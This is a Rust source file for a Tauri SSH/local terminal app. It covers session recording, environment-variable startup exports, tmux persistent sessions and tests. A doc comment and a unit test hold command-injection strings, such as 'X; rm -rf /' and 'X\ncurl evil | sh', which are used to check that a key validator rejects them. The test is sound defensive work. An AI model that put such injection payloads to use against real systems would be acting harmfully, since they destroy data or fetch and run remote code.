use termius_core::sync_ext::MutexExt;
use crate::state::{AppState, TerminalBackend, TerminalSession};
use serde::{Deserialize, Serialize};
use tauri::ipc::{Channel, InvokeResponseBody};
use tauri::{AppHandle, Emitter, Manager, State};
use termius_core::model::{HostId, PersistentShellMode, Workspace};
use termius_core::vault;
use termius_core::persistent_shell;
use termius_core::ssh::{self, ShellInput};
use termius_core::ssh_pool;
use tokio::sync::mpsc;
use uuid::Uuid;

#[derive(Serialize, Clone)]
pub(crate) struct TerminalClosedEvent {
    id: String,
}

/// Forwards a session's raw output channel to the frontend as raw bytes over
/// its dedicated `channel` (no JSON/base64 — same reasoning as RDP frames,
/// see `commands::rdp_view::connect_rdp_view`'s doc comment) until it closes,
/// then emits a plain `terminal-closed` event (fires at most once per
/// session, so its JSON overhead doesn't matter). Shared by every session
/// backend (SSH shell, Docker exec, ...) so each one only needs to produce a
/// plain `mpsc::Receiver<Vec<u8>>`, not know about Tauri events/channels
/// itself.
pub(crate) fn spawn_output_bridge(app: AppHandle, session_id: String, channel: Channel, mut output: mpsc::Receiver<Vec<u8>>) {
    let recorder = register_recorder_slot(&app, &session_id);
    tokio::spawn(async move {
        while let Some(bytes) = output.recv().await {
            record_chunk(&recorder, &bytes);
            if channel.send(InvokeResponseBody::Raw(bytes)).is_err() {
                break;
            }
        }
        finish_recording(&app, &session_id);
        let _ = app.emit("terminal-closed", TerminalClosedEvent { id: session_id });
    });
}

/// Creates this session's (empty) recording slot and registers it, returning
/// the handle for the output task to write through. See
/// [`crate::state::AppState::recorders`].
pub(crate) fn register_recorder_slot(app: &AppHandle, session_id: &str) -> crate::state::RecorderSlot {
    let slot: crate::state::RecorderSlot = Default::default();
    app.state::<AppState>().recorders.lock_recover().insert(session_id.to_string(), slot.clone());
    slot
}

/// Writes one output chunk to the recording, if this session has one.
///
/// A write failure (disk full, file removed underneath) drops the recording
/// rather than killing the session: the terminal itself must keep working —
/// losing a recording is bad, losing the shell someone is working in is worse.
pub(crate) fn record_chunk(slot: &crate::state::RecorderSlot, bytes: &[u8]) {
    let mut guard = slot.lock_recover();
    if let Some(recorder) = guard.as_mut()
        && recorder.write_output(bytes).is_err()
    {
        *guard = None;
    }
}

/// Flushes and forgets this session's recording, when the session ends.
pub(crate) fn finish_recording(app: &AppHandle, session_id: &str) {
    let slot = app.state::<AppState>().recorders.lock_recover().remove(session_id);
    if let Some(slot) = slot
        && let Some(recorder) = slot.lock_recover().take()
    {
        let _ = recorder.finish();
    }
}

/// Starts writing this session's output to `path` as an asciicast file.
///
/// `cols`/`rows` come from the frontend because xterm is what actually knows
/// the current size — see `termius_core::session_record::SessionRecorder`.
/// Recording is per session and opt-in: nothing is ever written to disk
/// unless this is called.
/// `host` is the label being recorded, or `None` for the local terminal —
/// carried only so the recording can be found again in the activity journal.
#[tauri::command]
pub fn start_session_recording(
    state: State<'_, AppState>,
    session_id: String,
    path: String,
    cols: u16,
    rows: u16,
    host: Option<String>,
) -> Result<(), String> {
    let slot = state
        .recorders
        .lock_recover()
        .get(&session_id)
        .cloned()
        .ok_or_else(|| "session de terminal inconnue ou déjà fermée".to_string())?;
    let mut guard = slot.lock_recover();
    if guard.is_some() {
        return Err("cette session est déjà en cours d'enregistrement".to_string());
    }
    let recorder = termius_core::session_record::SessionRecorder::create(std::path::Path::new(&path), cols, rows)
        .map_err(|e| format!("impossible de créer « {path} » : {e}"))?;
    *guard = Some(recorder);
    // Indexed after the recorder exists, and never allowed to fail the call:
    // the recording is the user's, the index is our convenience. Losing the
    // journal entry is a worse outcome than nothing only if it takes the
    // recording with it, which this makes impossible.
    if let Err(e) = termius_core::session_index::record_started(&path, termius_core::command_history::now_ms(), host) {
        eprintln!("impossible d'indexer l'enregistrement « {path} » : {e}");
    }
    Ok(())
}

/// Stops and flushes this session's recording. The session itself keeps
/// running — recording is not a mode the terminal is in, just a tap on its
/// output.
#[tauri::command]
pub fn stop_session_recording(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
    let slot = state.recorders.lock_recover().get(&session_id).cloned();
    let recorder = slot.and_then(|s| s.lock_recover().take());
    match recorder {
        Some(recorder) => {
            // Read before `finish` consumes the recorder, and closed after the
            // final write succeeds: an entry marked as cleanly stopped when the
            // tail never reached disk would be the one lie this index tells.
            let path = recorder.path().to_string_lossy().into_owned();
            recorder.finish().map_err(|e| format!("échec de l'écriture finale : {e}"))?;
            if let Err(e) = termius_core::session_index::record_stopped(&path, termius_core::command_history::now_ms()) {
                eprintln!("impossible de clôturer l'enregistrement « {path} » dans l'index : {e}");
            }
            Ok(())
        }
        None => Err("cette session n'était pas en cours d'enregistrement".to_string()),
    }
}

/// Session ids currently being recorded — lets the UI show the indicator on
/// the right tabs after a reload without tracking it itself.
#[tauri::command]
pub fn recording_session_ids(state: State<'_, AppState>) -> Vec<String> {
    state
        .recorders
        .lock_recover()
        .iter()
        .filter(|(_, slot)| slot.lock_recover().is_some())
        .map(|(id, _)| id.clone())
        .collect()
}

/// Wraps a value in single quotes, escaping any embedded single quotes.
/// Delegates to `core` so the escaping exists once — see [`termius_core::shell::quote`].
fn shell_quote(s: &str) -> String {
    termius_core::shell::quote(s)
}

/// Whether `key` is a safe environment-variable name to splice into a shell
/// `export` command. The *value* is single-quoted by [`shell_quote`], but the
/// name is not, so an attacker-influenced key — e.g. `X; curl evil | sh` coming
/// from an imported host file — would otherwise run as a command on connect.
/// Restrict to the POSIX-portable name shape (`[A-Za-z_][A-Za-z0-9_]*`).
fn is_valid_env_key(key: &str) -> bool {
    let mut chars = key.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Startup commands common to any shell-like session for `host_id`: `export`
/// lines for `host.env_vars`, then each configured `startup_snippets`'
/// command, in that order — matches `Host::startup_snippets`'s doc comment.
/// Shared by [`connect_terminal`] (SSH) and
/// [`crate::commands::docker::connect_docker_exec`] (Docker exec): both open
/// a POSIX-ish shell on the other end and drive it the same way.
pub(crate) fn startup_commands(workspace: &Workspace, host_id: HostId) -> Vec<Vec<u8>> {
    startup_commands_with(workspace, host_id, &|id, name| {
        vault::load_env_var(id, name).ok().flatten()
    })
}

/// The half of [`startup_commands`] that doesn't touch the vault, so the
/// behaviour that matters — what happens when a secret can't be read — is
/// testable without a keychain, and without writing to the developer's real
/// one.
fn startup_commands_with(
    workspace: &Workspace,
    host_id: HostId,
    resolve: &dyn Fn(HostId, &str) -> Option<String>,
) -> Vec<Vec<u8>> {
    let mut cmds = Vec::new();
    if let Some(host) = workspace.host(host_id) {
        for ev in &host.env_vars {
            if !is_valid_env_key(&ev.key) {
                continue;
            }
            if ev.secret {
                // A locked vault is the ordinary reason this fails. Saying so
                // *in the session* beats exporting nothing: a variable that is
                // declared on the host and silently absent from the shell looks
                // like the app is broken, and the failure surfaces much later,
                // as whatever needed the token failing for no visible reason.
                match resolve(host_id, &ev.key) {
                    Some(value) => {
                        cmds.push(format!("export {}={}\n", ev.key, shell_quote(&value)).into_bytes())
                    }
                    None => cmds.push(
                        format!(
                            "printf '%s\\n' {} >&2\n",
                            shell_quote(&format!(
                                "guiterm : {} non exportée — secret illisible (coffre verrouillé ?)",
                                ev.key
                            ))
                        )
                        .into_bytes(),
                    ),
                }
                continue;
            }
            cmds.push(format!("export {}={}\n", ev.key, shell_quote(&ev.value)).into_bytes());
        }
        for &sid in &host.startup_snippets {
            if let Some(snip) = workspace.snippets.iter().find(|s| s.id == sid) {
                cmds.push(format!("{}\n", snip.command).into_bytes());
            }
        }
    }
    cmds
}

/// Everything a freshly-opened shell needs to be registered under.
///
/// A struct rather than five more parameters: `register_shell_session` had
/// eight of them once `replay_startup` joined, which clippy rejects and a
/// reader shouldn't have to count either.
pub(crate) struct NewShellSession {
    pub host_id: HostId,
    pub backend: TerminalBackend,
    pub channel: Channel,
    pub session: ssh::ShellSession,
    /// `false` only for a reattachment to a persistent session that is
    /// already running — see [`register_shell_session`] for why that case is
    /// special.
    pub replay_startup: bool,
}

/// Finishes wiring a freshly-opened shell session into the app: spawns the
/// `terminal-data` output bridge, replays `host_id`'s startup commands, and
/// registers the session under a new id. Shared tail of [`connect_terminal`]
/// (SSH) and [`crate::commands::docker::connect_docker_exec`] — both hand it
/// the very same [`ssh::ShellSession`] shape once their backend-specific
/// connect step is done, so only that step still differs between the two.
///
/// `replay_startup` is `false` for exactly one case: reattaching to a
/// persistent session that is already running (see
/// [`termius_core::persistent_shell`]). The startup commands are *typed into
/// the shell*, so replaying them there would re-export the environment and
/// re-run every startup snippet **inside the session someone is working in**,
/// on top of whatever is already on screen. They belong to opening a shell,
/// not to opening a connection — a distinction that did not exist as long as
/// the two were the same thing.
pub(crate) async fn register_shell_session(
    app: AppHandle,
    state: &AppState,
    workspace: &Workspace,
    opened: NewShellSession,
) -> String {
    let NewShellSession { host_id, backend, channel, session, replay_startup } = opened;
    let session_id = Uuid::new_v4().to_string();
    let ssh::ShellSession { input, output } = session;

    spawn_output_bridge(app, session_id.clone(), channel, output);

    if replay_startup {
        for cmd in startup_commands(workspace, host_id) {
            let _ = input.send(ShellInput::Data(cmd)).await;
        }
    }

    state.terminals.lock_recover().insert(session_id.clone(), TerminalSession { backend, input });
    session_id
}

/// What became of the persistent session this terminal asked for.
///
/// A plain unit-variant enum, so `rename_all = "camelCase"` really does rename
/// what reaches the frontend (`"created"`, `"resumed"`, …) — unlike an
/// internally-tagged enum with struct variants, where it renames the variant
/// names and leaves their fields in `snake_case`. That trap has been hit six
/// times in this repo; `persistence_outcome_is_camel_case` below pins the
/// actual JSON rather than trusting a Rust→Rust roundtrip.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum PersistenceOutcome {
    /// The host isn't configured for persistent sessions — ordinary shell.
    Off,
    /// It is, but the host has no `tmux`: ordinary shell, and the frontend
    /// says so once rather than silently pretending the session will survive.
    Unavailable,
    /// A persistent session was created for this terminal.
    Created,
    /// An existing persistent session was reattached — this is the whole point.
    Resumed,
}

/// A freshly-opened terminal.
///
/// Used to be just the session id. It now also carries the persistent-session
/// key, because **the frontend is what remembers it**: the key has to outlive
/// the process to be worth anything, and the tab is the thing that is already
/// persisted across restarts.
#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TerminalOpened {
    pub session_id: String,
    /// The key to hand back on the next connect, or `None` when this terminal
    /// is not persistent. Not necessarily the key that was *asked* for: an
    /// unusable one is replaced rather than refused (see
    /// [`persistent_shell::is_valid_session_key`]).
    pub session_key: Option<String>,
    pub persistence: PersistenceOutcome,
    /// Ce terminal observe une session sans pouvoir y taper.
    pub read_only: bool,
    /// La taille demandée pour le pty. En observation, c'est **celle de la
    /// session**, pas celle de la fenêtre : s'attacher à une autre taille
    /// redimensionne la session pour tout le monde, `-r` ou pas.
    pub cols: u16,
    pub rows: u16,
}

/// Ce que le frontend demande d'une session persistante à l'ouverture d'un
/// terminal.
///
/// Un struct plutôt que trois arguments de plus : la commande en avait déjà
/// cinq, et ces trois-là vont ensemble — ils ne veulent rien dire sur un hôte
/// qui n'est pas en session persistante.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionOptions {
    /// La session que cet onglet utilisait la fois d'avant, s'il en avait une.
    pub key: Option<String>,
    /// Rejoindre sans pouvoir taper — voir [`persistent_shell::observe_command`].
    #[serde(default)]
    pub read_only: bool,
    /// Masquer la barre d'état de tmux dans cette session. Jamais appliqué en
    /// observation : changer l'apparence d'une session qu'on ne fait que
    /// regarder la changerait pour ceux qui y travaillent.
    #[serde(default)]
    pub hide_status_bar: bool,
    /// Laisser tmux recevoir les événements souris, ce qui rend la molette
    /// utile — voir [`persistent_shell::SessionAppearance::mouse`]. Même
    /// réserve qu'au-dessus pour l'observation.
    #[serde(default)]
    pub mouse: bool,
}

/// Connects to `host_id` and starts an interactive shell, streaming its/// Connects to `host_id` and starts an interactive shell, streaming its
/// output back as raw bytes over `channel` (see [`spawn_output_bridge`]) —
/// `channel` is a dedicated `tauri::ipc::Channel` the caller creates just for
/// this session, mirroring `connect_rdp_view`'s frame channel.
///
/// `session_key` is the persistent session this tab was using last time, if
/// any. Everything about it is best-effort: an unusable key is replaced, a
/// host without `tmux` gets the ordinary shell, and a failed probe is treated
/// as "no tmux" — none of those may cost the user their connection.
#[tauri::command]
pub async fn connect_terminal(
    app: AppHandle,
    state: State<'_, AppState>,
    host_id: HostId,
    session: SessionOptions,
    channel: Channel,
) -> Result<TerminalOpened, String> {
    let SessionOptions { key: session_key, read_only, hide_status_bar, mouse } = session;
    let appearance = persistent_shell::SessionAppearance { hide_status_bar, mouse };
    let workspace = state.workspace.lock_recover().clone();
    let host = workspace.host(host_id);
    let agent_forward = host.map(|h| h.agent_forward).unwrap_or(false);
    let wants_persistence =
        host.map(|h| h.persistent_shell) == Some(PersistentShellMode::Tmux);
    let connection = ssh_pool::acquire(&workspace, host_id).await.map_err(|e| e.to_string())?;

    // An invalid key is dropped rather than refused: it can only come from a
    // tampered-with or corrupted `localStorage`, and the sane outcome there is
    // a fresh session, not a terminal that won't open.
    let requested = session_key.filter(|key| persistent_shell::is_valid_session_key(key));

    // Observer, c'est rejoindre quelque chose qui existe. Une session absente
    // est donc une erreur nommée, pas une session à créer : ouvrir un terminal
    // en lecture seule sur un shell qu'on vient de faire naître n'a aucun sens,
    // et `attach-session` échouerait de toute façon une seconde plus tard avec
    // un message de tmux que personne ne relie à ce qu'il a demandé.
    let listing = if wants_persistence {
        Some(persistent_shell::probe(&connection, requested.as_deref()).await)
    } else {
        None
    };
    if read_only && listing != Some(persistent_shell::Probe::Running) {
        return Err("cette session n'est plus ouverte sur l'hôte — rien à observer".to_string());
    }

    let (command, key, persistence) = match listing {
        None => (None, None, PersistenceOutcome::Off),
        Some(persistent_shell::Probe::NoTmux) => (None, None, PersistenceOutcome::Unavailable),
        Some(persistent_shell::Probe::Running) => {
            // `Running` cannot be reached with `requested == None`, but
            // falling back to a new key is still the right shape: it keeps
            // this arm total without an `unwrap`.
            let key = requested.unwrap_or_else(persistent_shell::new_session_key);
            let command = if read_only {
                persistent_shell::observe_command(&key)
            } else {
                persistent_shell::attach_command(&key, appearance)
            };
            (Some(command), Some(key), PersistenceOutcome::Resumed)
        }
        Some(persistent_shell::Probe::Absent) => {
            let key = requested.unwrap_or_else(persistent_shell::new_session_key);
            (Some(persistent_shell::attach_command(&key, appearance)), Some(key), PersistenceOutcome::Created)
        }
    };

    // La taille du pty décide de celle de la session : un client plus petit la
    // rétrécit pour tous ceux qui y sont attachés, **y compris en lecture
    // seule** (mesuré sur tmux 3.4). Un observateur demande donc exactement la
    // taille qu'elle a déjà, et ne la redimensionnera plus ensuite (le
    // frontend n'appelle pas `resize_terminal` sur un onglet en observation).
    // Les 80×24 des autres cas sont le provisoire d'avant le premier `resize`,
    // inchangé.
    let (cols, rows) = match (read_only, key.as_deref()) {
        (true, Some(key)) => session_size(&connection, key).await.unwrap_or((80, 24)),
        _ => (80, 24),
    };

    let shell = ssh::open_shell_with_command(&connection, cols, rows, agent_forward, command.as_deref())
        .await
        .map_err(|e| e.to_string())?;

    // Reattaching is the one case that must not replay the startup commands —
    // see `register_shell_session`.
    let replay_startup = persistence != PersistenceOutcome::Resumed;
    let session_id = register_shell_session(
        app,
        &state,
        &workspace,
        NewShellSession {
            host_id,
            backend: TerminalBackend::Ssh(connection),
            channel,
            session: shell,
            replay_startup,
        },
    )
    .await;

    Ok(TerminalOpened { session_id, session_key: key, persistence, read_only, cols, rows })
}

/// La taille actuelle d'une session, si on arrive à la lire.
///
/// Best-effort : sans elle on retombe sur 80×24, ce qui rétrécira la session —
/// désagréable, mais moins que refuser d'ouvrir le terminal.
async fn session_size(connection: &termius_core::ssh::Connection, key: &str) -> Option<(u16, u16)> {
    let listing = persistent_shell::list(connection).await.ok()?;
    let session = listing.sessions.into_iter().find(|s| s.key == key)?;
    // `client_size` et non `(width, height)` : la fenêtre fait la taille du
    // client moins la barre d'état, donc demander la taille de la fenêtre lui
    // prendrait une ligne à chaque attache.
    session.client_size()
}

/// Les sessions persistantes qui tournent sur `host_id`.
///
/// Un aller-retour SSH par appel, sur une connexion du pool — donc jamais une
/// connexion de plus quand un terminal est déjà ouvert sur cet hôte. Rendue
/// telle quelle même quand l'hôte n'a pas tmux : « je ne peux pas savoir » et
/// « rien ne tourne » sont deux réponses différentes (voir
/// [`persistent_shell::SessionListing`]).
#[tauri::command]
pub async fn list_persistent_sessions(
    state: State<'_, AppState>,
    host_id: HostId,
) -> Result<persistent_shell::SessionListing, String> {
    let workspace = state.workspace.lock_recover().clone();
    let connection = ssh_pool::acquire(&workspace, host_id).await.map_err(|e| e.to_string())?;
    persistent_shell::list(&connection).await.map_err(|e| e.to_string())
}

/// La ligne qu'un collègue peut coller dans son propre terminal pour observer
/// la même session.
///
/// L'app ne peut pas inviter qui que ce soit : il n'y a pas de relais, et
/// rejoindre une session suppose d'avoir déjà un accès SSH à l'hôte. Elle peut
/// en revanche écrire la commande exacte, ce qui évite de la reconstruire de
/// mémoire — et de se tromper sur le `-t`, dont l'absence donne une erreur tmux
/// qui ne dit pas quoi corriger.
#[tauri::command]
pub fn persistent_session_share_command(
    state: State<'_, AppState>,
    host_id: HostId,
    session_key: String,
) -> Result<String, String> {
    let workspace = state.workspace.lock_recover();
    let host = workspace.host(host_id).ok_or_else(|| "hôte introuvable".to_string())?;
    if !persistent_shell::is_valid_session_key(&session_key) {
        return Err("nom de session invalide".to_string());
    }
    Ok(persistent_shell::share_command(
        &host.username,
        &host.address,
        host.port,
        &session_key,
    ))
}

/// Termine une session et rend la liste à jour — l'appelant réaffiche de
/// toute façon ce qui reste, comme `docker_container_action`.
///
/// Le garde-fou est côté `core` ([`persistent_shell::kill_command`]) et pas
/// ici : une session que l'app n'a pas ouverte est refusée avant que quoi que
/// ce soit parte sur le réseau.
#[tauri::command]
pub async fn kill_persistent_session(
    state: State<'_, AppState>,
    host_id: HostId,
    session_key: String,
) -> Result<persistent_shell::SessionListing, String> {
    let workspace = state.workspace.lock_recover().clone();
    let connection = ssh_pool::acquire(&workspace, host_id).await.map_err(|e| e.to_string())?;
    persistent_shell::kill(&connection, &session_key).await.map_err(|e| e.to_string())
}

fn terminal_input(state: &AppState, session_id: &str) -> Result<tokio::sync::mpsc::Sender<ShellInput>, String> {
    state.terminals.lock_recover().get(session_id).map(|t| t.input.clone()).ok_or_else(|| "session inconnue".to_string())
}

/// Header carrying the session id on the byte-payload write commands. The
/// payload itself *is* the keystroke bytes (see [`raw_write_payload`]), so
/// there is no JSON object left to put a normal argument in.
pub(crate) const SESSION_ID_HEADER: &str = "x-session-id";

/// Extracts `(session_id, bytes)` from a request whose body is the raw
/// keystrokes rather than JSON.
///
/// Keystrokes used to travel as base64 inside a JSON argument: encoded
/// character by character in JS, parsed as JSON, then decoded back to bytes
/// here — three conversions on the single most frequent call in the app, and
/// ~33% more bytes on the wire. Terminal *output* already avoided all that by
/// riding a `tauri::ipc::Channel`; this gives the input side the same
/// treatment, using the raw-body form of `invoke` (`InvokeBody::Raw`).
fn raw_write_payload(request: &tauri::ipc::Request<'_>) -> Result<(String, Vec<u8>), String> {
    let session_id = request
        .headers()
        .get(SESSION_ID_HEADER)
        .and_then(|v| v.to_str().ok())
        .ok_or_else(|| format!("en-tête {SESSION_ID_HEADER} manquant"))?
        .to_string();
    let tauri::ipc::InvokeBody::Raw(bytes) = request.body() else {
        return Err("charge utile binaire attendue".to_string());
    };
    Ok((session_id, bytes.clone()))
}

#[tauri::command]
pub async fn write_terminal(state: State<'_, AppState>, request: tauri::ipc::Request<'_>) -> Result<(), String> {
    let (session_id, bytes) = raw_write_payload(&request)?;
    let input = terminal_input(&state, &session_id)?;
    input.send(ShellInput::Data(bytes)).await.map_err(|_| "session fermée".to_string())
}

#[tauri::command]
pub async fn resize_terminal(state: State<'_, AppState>, session_id: String, cols: u16, rows: u16) -> Result<(), String> {
    let input = terminal_input(&state, &session_id)?;
    input.send(ShellInput::Resize { cols, rows }).await.map_err(|_| "session fermée".to_string())
}

#[tauri::command]
pub fn close_terminal(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
    state.terminals.lock_recover().remove(&session_id);
    Ok(())
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
pub struct ShellInfo {
    pub id: String,
    pub label: String,
}

fn shell_on_path(exe: &str) -> bool {
    std::env::var("PATH").is_ok_and(|path_var| {
        let sep = if cfg!(windows) { ';' } else { ':' };
        path_var.split(sep).any(|dir| std::path::Path::new(dir).join(exe).is_file())
    })
}

/// Detects interactive shells available on this system, so the user can pick one
/// when opening a local terminal (e.g. cmd vs PowerShell on Windows) instead of
/// always getting the one hardcoded default.
#[tauri::command]
pub fn list_local_shells() -> Vec<ShellInfo> {
    let mut shells = Vec::new();

    if cfg!(windows) {
        // Always present on any normal Windows install — no need to probe PATH for these.
        shells.push(ShellInfo { id: "powershell.exe".to_string(), label: "Windows PowerShell".to_string() });
        shells.push(ShellInfo { id: "cmd.exe".to_string(), label: "Invite de commandes (cmd)".to_string() });
        if shell_on_path("pwsh.exe") {
            shells.push(ShellInfo { id: "pwsh.exe".to_string(), label: "PowerShell 7".to_string() });
        }
        for git_bash in [r"C:\Program Files\Git\bin\bash.exe", r"C:\Program Files (x86)\Git\bin\bash.exe"] {
            if std::path::Path::new(git_bash).is_file() {
                shells.push(ShellInfo { id: git_bash.to_string(), label: "Git Bash".to_string() });
                break;
            }
        }
        let wsl = r"C:\Windows\System32\wsl.exe";
        if std::path::Path::new(wsl).is_file() {
            shells.push(ShellInfo { id: wsl.to_string(), label: "WSL".to_string() });
        }
    } else {
        let mut seen = std::collections::HashSet::new();
        if let Ok(current) = std::env::var("SHELL")
            && !current.is_empty() && seen.insert(current.clone()) {
            let label = current.rsplit('/').next().unwrap_or(&current);
            shells.push(ShellInfo { id: current.clone(), label: format!("{label} (courant)") });
        }
        if let Ok(content) = std::fs::read_to_string("/etc/shells") {
            for line in content.lines() {
                let path = line.trim();
                if path.is_empty() || path.starts_with('#') || !std::path::Path::new(path).is_file() { continue; }
                if seen.insert(path.to_string()) {
                    let label = path.rsplit('/').next().unwrap_or(path).to_string();
                    shells.push(ShellInfo { id: path.to_string(), label });
                }
            }
        }
    }

    shells
}

#[tauri::command]
pub async fn open_local_terminal(app: AppHandle, state: State<'_, AppState>, shell: Option<String>, channel: Channel) -> Result<String, String> {
    use portable_pty::{native_pty_system, CommandBuilder, PtySize};
    use std::io::Read;

    let shell = termius_core::local_shell::resolve_local_shell(shell.as_deref());

    let pty_system = native_pty_system();
    let pair = pty_system
        .openpty(PtySize { rows: 24, cols: 80, pixel_width: 0, pixel_height: 0 })
        .map_err(|e| e.to_string())?;

    let cmd = CommandBuilder::new(&shell);
    pair.slave.spawn_command(cmd).map_err(|e| e.to_string())?;
    drop(pair.slave);

    let writer = pair.master.take_writer().map_err(|e| e.to_string())?;
    let mut reader = pair.master.try_clone_reader().map_err(|e| e.to_string())?;

    let session_id = Uuid::new_v4().to_string();
    let emit_id = session_id.clone();
    let app_handle = app.clone();
    // Local terminals read their PTY on a blocking thread rather than through
    // `spawn_output_bridge`'s channel, so the recording hook is repeated here.
    let recorder = register_recorder_slot(&app, &session_id);
    tokio::task::spawn_blocking(move || {
        let mut buf = [0u8; 4096];
        loop {
            match reader.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    record_chunk(&recorder, &buf[..n]);
                    if channel.send(InvokeResponseBody::Raw(buf[..n].to_vec())).is_err() {
                        break;
                    }
                }
            }
        }
        finish_recording(&app_handle, &emit_id);
        let _ = app_handle.emit("terminal-closed", TerminalClosedEvent { id: emit_id });
    });

    state.local_terminals.lock_recover().insert(
        session_id.clone(),
        crate::state::LocalTerminalSession { master: crate::state::SendMasterPty(pair.master), writer },
    );

    Ok(session_id)
}

#[tauri::command]
pub async fn write_local_terminal(app: AppHandle, request: tauri::ipc::Request<'_>) -> Result<(), String> {
    let (session_id, bytes) = raw_write_payload(&request)?;
    // The write is a blocking std::io::Write call (kernel PTY buffer) — every
    // keystroke to a local terminal goes through this command, so keep it off
    // the tokio worker thread the same way the read side already does.
    tokio::task::spawn_blocking(move || {
        use std::io::Write;
        use tauri::Manager;
        let state = app.state::<AppState>();
        let mut sessions = state.local_terminals.lock_recover();
        let session = sessions.get_mut(&session_id).ok_or_else(|| "session inconnue".to_string())?;
        session.writer.write_all(&bytes).map_err(|e| e.to_string())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
pub async fn resize_local_terminal(state: State<'_, AppState>, session_id: String, cols: u16, rows: u16) -> Result<(), String> {
    use portable_pty::PtySize;
    let sessions = state.local_terminals.lock_recover();
    let session = sessions.get(&session_id).ok_or_else(|| "session inconnue".to_string())?;
    session.master.0.resize(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 }).map_err(|e| e.to_string())
}

#[tauri::command]
pub fn close_local_terminal(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
    state.local_terminals.lock_recover().remove(&session_id);
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The casing that actually reaches the frontend, checked on the emitted
    /// JSON rather than a Rust→Rust roundtrip — which would pass just as well
    /// with the wrong casing on both sides. `TerminalTab`'s `assertNever`
    /// switch reads these exact strings.
    #[test]
    fn persistence_outcome_is_camel_case() {
        for (outcome, expected) in [
            (PersistenceOutcome::Off, "\"off\""),
            (PersistenceOutcome::Unavailable, "\"unavailable\""),
            (PersistenceOutcome::Created, "\"created\""),
            (PersistenceOutcome::Resumed, "\"resumed\""),
        ] {
            assert_eq!(serde_json::to_string(&outcome).unwrap(), expected);
        }
    }

    /// And the field names of what wraps it: `session_id`/`session_key` have
    /// to arrive as `sessionId`/`sessionKey`, which is exactly the kind of
    /// silent mismatch this repo has already paid for six times.
    #[test]
    fn terminal_opened_field_names_are_camel_case() {
        let json = serde_json::to_value(TerminalOpened {
            session_id: "s1".into(),
            session_key: Some("guiterm-abc".into()),
            persistence: PersistenceOutcome::Resumed,
            read_only: true,
            cols: 200,
            rows: 50,
        })
        .unwrap();
        assert_eq!(json["sessionId"], "s1");
        assert_eq!(json["sessionKey"], "guiterm-abc");
        assert_eq!(json["persistence"], "resumed");
        assert_eq!(json["readOnly"], true);
        // La taille voyage aussi : c'est elle que le terminal doit adopter en
        // observation, au lieu de s'ajuster à sa fenêtre.
        assert_eq!(json["cols"], 200);
        assert_eq!(json["rows"], 50);
    }

    #[test]
    fn valid_env_keys_are_accepted() {
        for ok in ["PATH", "_x1", "MY_VAR", "A", "_"] {
            assert!(is_valid_env_key(ok), "{ok:?} should be a valid env key");
        }
    }

    #[test]
    fn injection_shaped_env_keys_are_rejected() {
        for bad in [
            "",
            "1abc",
            "A B",
            "X; rm -rf /",
            "X=$(id)",
            "X\ncurl evil | sh",
            "PATH-EXTRA",
        ] {
            assert!(!is_valid_env_key(bad), "{bad:?} must be rejected");
        }
    }

    #[test]
    fn shell_quote_neutralises_single_quotes() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("a'b"), r"'a'\''b'");
    }

    fn workspace_with_env(vars: Vec<termius_core::model::EnvVar>) -> (Workspace, HostId) {
        let mut host = termius_core::model::Host::new(
            "test".to_string(),
            "10.0.0.1".to_string(),
            "root".to_string(),
        );
        host.env_vars = vars;
        let id = host.id;
        let mut workspace = Workspace::default();
        workspace.hosts.push(host);
        (workspace, id)
    }

    fn lines(commands: Vec<Vec<u8>>) -> String {
        commands.into_iter().map(|c| String::from_utf8(c).unwrap()).collect()
    }

    /// A secret variable's value comes from the vault, never from the host —
    /// where it isn't, since it never gets written there.
    #[test]
    fn a_secret_variable_is_exported_from_the_vault() {
        let (workspace, id) = workspace_with_env(vec![
            termius_core::model::EnvVar { key: "EDITOR".to_string(), value: "vim".to_string(), secret: false },
            termius_core::model::EnvVar { key: "API_TOKEN".to_string(), value: String::new(), secret: true },
        ]);
        let out = lines(startup_commands_with(&workspace, id, &|_, name| {
            (name == "API_TOKEN").then(|| "sk-du-coffre".to_string())
        }));
        assert!(out.contains("export EDITOR='vim'"), "obtenu : {out}");
        assert!(out.contains("export API_TOKEN='sk-du-coffre'"), "obtenu : {out}");
    }

    /// The case the plan called out: vault locked at session start. Exporting
    /// nothing silently would surface much later as whatever needed the token
    /// failing for no visible reason — so the session says it, and says why.
    #[test]
    fn an_unreadable_secret_is_announced_instead_of_silently_skipped() {
        let (workspace, id) = workspace_with_env(vec![termius_core::model::EnvVar {
            key: "API_TOKEN".to_string(),
            value: String::new(),
            secret: true,
        }]);
        let out = lines(startup_commands_with(&workspace, id, &|_, _| None));
        assert!(!out.contains("export API_TOKEN"), "rien ne doit être exporté : {out}");
        assert!(out.contains("API_TOKEN non exportée"), "obtenu : {out}");
        assert!(out.contains("coffre"), "la raison probable doit être dite : {out}");
    }

    /// A stale value left on a secret variable by an older workspace must not
    /// be used as a fallback: it is exactly the plaintext this feature exists
    /// to stop trusting.
    #[test]
    fn a_leftover_plaintext_value_is_not_used_for_a_secret_variable() {
        let (workspace, id) = workspace_with_env(vec![termius_core::model::EnvVar {
            key: "API_TOKEN".to_string(),
            value: "ancien-en-clair".to_string(),
            secret: true,
        }]);
        let out = lines(startup_commands_with(&workspace, id, &|_, _| None));
        assert!(!out.contains("ancien-en-clair"), "obtenu : {out}");
    }
}
